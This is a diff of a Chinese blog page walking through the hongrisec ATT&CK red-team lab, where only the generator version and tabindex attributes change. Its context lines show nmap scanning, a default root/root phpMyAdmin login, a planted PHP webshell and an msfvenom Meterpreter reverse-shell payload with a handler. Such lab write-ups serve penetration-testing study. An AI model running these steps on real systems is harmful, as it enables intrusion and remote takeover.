@@ -28,7 +28,7 @@ Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 9
 <link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
 <meta name=theme-color content="#2e2e33">
 <meta name=msapplication-TileColor content="#2e2e33">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <meta property="og:title" content="ATT&CK实战一">
 <meta property="og:description" content="一、环境搭建 1.1 下载虚拟机文件 自行搜索。
 1.2 环境介绍 开机密码：hongrisec@2019.
@@ -173,7 +173,7 @@ July 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;DaChui
 <h1 id=二信息收集>二、信息收集<a hidden class=anchor aria-hidden=true href=#二信息收集>#</a></h1>
 <h2 id=21-探测存活主机>2.1 探测存活主机<a hidden class=anchor aria-hidden=true href=#21-探测存活主机>#</a></h2>
 <p>命令：</p>
-<pre><code>nmap -sS -sV -O 192.168.106.0/24
+<pre tabindex=0><code>nmap -sS -sV -O 192.168.106.0/24
 
 # 此处的IP为NAT模式下Win7和Kali自动获取到的IP
 # 参数说明
@@ -181,7 +181,7 @@ sS		:		SYN半连接扫描，只进行前两次握手
 sV		:		显示服务器详细版本
 O		:		显示服务器操作系统(不太准确)
 </code></pre><p>结果：</p>
-<pre><code>Nmap scan report for 192.168.106.150
+<pre tabindex=0><code>Nmap scan report for 192.168.106.150
 Host is up (0.00044s latency).
 Not shown: 998 filtered ports
 PORT     STATE SERVICE VERSION
@@ -206,7 +206,7 @@ Network Distance: 1 hop
 <p>使用<code>dirbuster</code>或御剑等工具扫描目录，发现<code>/phpmyadmin/</code>登录目录和<code>beifen.rar</code>网站源代码。</p>
 <p>访问<code>192.168.106.150/phpmyadmin</code>使用默认账密<code>root/root</code>登录<code>phpmyadmin</code>后台管理页面。</p>
 <p>查看下载下来的网站源代码，发现网站使用了<code>yxcms</code>，访问<code>192.168.106.150/yxcms</code>，发现是一个默认的演示站点，继续访问<code>192.168.106.150/yxcms/robots.txt</code>，内容如下：</p>
-<pre><code>#
+<pre tabindex=0><code>#
 # robots.txt for YXCMS
 #
 User-agent: * 
@@ -237,7 +237,7 @@ Disallow: /protected
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721172858019.png alt=image-20210721172858019>
 </p>
 <p>创建之后，根据之前的目录索引或网站源码查找文件存储路径：<code>http://192.168.106.150/yxcms/protected/apps/default/view/default/</code>，使用蚁剑连接小马：</p>
-<pre><code>Shell url	:	http://192.168.106.150/yxcms/protected/apps/default/view/default/oopsdc.php
+<pre tabindex=0><code>Shell url	:	http://192.168.106.150/yxcms/protected/apps/default/view/default/oopsdc.php
 Shell pwd	:	cmd
 </code></pre><p>成功连接。</p>
 <h3 id=315-yxcms后台sql注入漏洞>3.1.5 yxcms后台SQL注入漏洞<a hidden class=anchor aria-hidden=true href=#315-yxcms后台sql注入漏洞>#</a></h3>
@@ -274,7 +274,7 @@ Shell pwd	:	cmd
 <p>上传大马获得命令执行环境。</p>
 <h3 id=322-msf监听反弹shell>3.2.2 msf监听反弹shell<a hidden class=anchor aria-hidden=true href=#322-msf监听反弹shell>#</a></h3>
 <p>进入<code>msf</code>：</p>
-<pre><code>msfconsole
+<pre tabindex=0><code>msfconsole
 </code></pre><p>使用<code>msfvenom</code>生成<code>payload</code>文件，使用蚁剑上传至<code>WWW</code>目录：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p php/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>192.168.106.138 -f raw &gt; test.php
 
@@ -284,7 +284,7 @@ f		:		输出文件格式，文件会在当前目录生成
 </code></pre></div><p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721195859418.png alt=image-20210721195859418>
 </p>
 <p>接下来使用<code>handler</code>模块接收反弹模块，在<code>8888</code>端口进行监听，访问<code>test.php</code>，连接成功：</p>
-<pre><code>use exploit/multi/handler
+<pre tabindex=0><code>use exploit/multi/handler
 run
 </code></pre><p>还可利用应用系统漏洞，如永恒之蓝等。</p>
 <h3 id=323-免杀payload>3.2.3 免杀payload<a hidden class=anchor aria-hidden=true href=#323-免杀payload>#</a></h3>
